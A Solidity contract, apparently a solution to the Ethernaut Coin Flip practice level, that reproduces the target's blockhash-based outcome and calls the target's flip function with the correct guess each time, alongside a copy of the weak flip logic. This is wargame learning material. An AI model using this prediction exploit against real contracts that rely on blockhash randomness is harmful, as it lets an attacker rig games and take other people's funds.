// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

//import "./SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
    using SafeMath for uint;
    using SafeMath for uint256;

    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function coinFlipGuess(address _coinFlipAddr) external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
        return isRight;
    }

    function makeGuess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;

        // console.log(block.number.sub(1));
        return guess;
    }

    function flip(bool _guess) public returns (bool) {
    
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
